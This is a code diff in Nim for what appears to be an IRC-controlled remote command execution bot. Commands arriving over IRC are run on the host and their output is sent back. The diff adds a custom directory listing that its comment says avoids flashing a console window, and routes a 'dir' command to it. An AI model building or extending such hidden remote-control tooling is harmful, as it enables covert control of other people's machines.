@@ -10,7 +10,6 @@ var
     g_send_sleep_time = 500 #used in helper_responseHandler
 
 
-
 type
     ExecResponse = tuple
         exitCode:int
@@ -115,7 +114,7 @@ proc helper_responseHandler(event:IrcEvent, client:AsyncIrc, response:Future[Exe
                 try:
                     value_filtered = convert(value_filtered, getCurrentEncoding(true), "ibm850")
                 except OSError as e:
-                    value_filtered = value_filtered & "\nENCODE TO UTF-8 FAILED [" & repr(e)& "]"
+                    value_filtered = value_filtered & "\nENCODE TO UTF-8 FAILED [" & repr(e) & "]"
 
                 for line in value_filtered.splitLines():
                     if g_abort: break
@@ -148,6 +147,81 @@ proc rexec_runCommand(cmd:string):Future[ExecResponse] {.async.} =
 
 
 
+
+## Selfmade directory listing doesnt flash console
+proc rexec_directoryListing(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
+    var
+        folders:seq[string]
+        files:seq[string]
+        cwd = await helper_recombine(tokens,2)
+        spacer_len = 0
+
+    for kind, path in walkDir(cwd):
+        case kind:
+        of pcDir:
+            folders.add(path)
+        of pcFile:
+            files.add(path)
+        else:
+            continue
+
+    proc spacer(amt:int):string =
+        var cnt = amt
+        result = ""
+        while cnt > 0:
+            cnt -= 1
+            result &= " "
+        return result
+
+    var
+        row_cnt = 0
+        row_max = 4
+
+        folder_str = ""
+        file_str = ""
+
+    for folder in folders:
+        if len("[" & splitPath(folder).tail & "]") > spacer_len:
+            spacer_len = len("[" & splitPath(folder).tail & "]")
+
+    for file in files:
+        if len(splitPath(file).tail) > spacer_len:
+            spacer_len = len(splitPath(file).tail)
+
+    if spacer_len < 30:
+        row_max = 4
+    elif spacer_len > 30 and spacer_len < 40:
+        row_max = 3
+    elif spacer_len > 40 and spacer_len < 50:
+        row_max = 2
+    elif spacer_len > 50:
+        row_max = 1
+
+    for folder in folders:
+        var foldername = "[" & splitPath(folder).tail & "]"
+        folder_str &=  foldername  & spacer(spacer_len-(len(foldername)))
+        row_cnt += 1
+        if row_cnt >= row_max:
+            folder_str &= "\n"
+            row_cnt = 0
+
+    row_cnt = 0
+
+    for file in files:
+        var filename = splitPath(file).tail
+        file_str &= filename & spacer(spacer_len-len(filename))
+        row_cnt += 1
+        if row_cnt >= row_max:
+            file_str &= "\n"
+            row_cnt = 0
+    
+    var output = "\nPath: [" & cwd & "]\n" & folder_str & "\n" & file_str
+    discard helper_responseHandler(event, client, helper_setResponse(output,0))
+
+
+
+
+
 ## Because just using cd with execCmdEx doesnt do anything
 proc rexec_changeDir(path:string):Future[bool] {.async.} =
     if os.dirExists(path):
@@ -155,7 +229,6 @@ proc rexec_changeDir(path:string):Future[bool] {.async.} =
         return true
     else:
         return false
-
 
 
 
@@ -318,6 +391,8 @@ proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
         #response = await rexec_runCommand("dir /w")
         discard helper_responseHandler(event, client, rexec_runCommand("dir /w"))
         #caught = true
+    of "dir":
+        discard rexec_directoryListing(event, client, tokens)
     else:
         var args:string
         args = await helper_recombine(tokens)
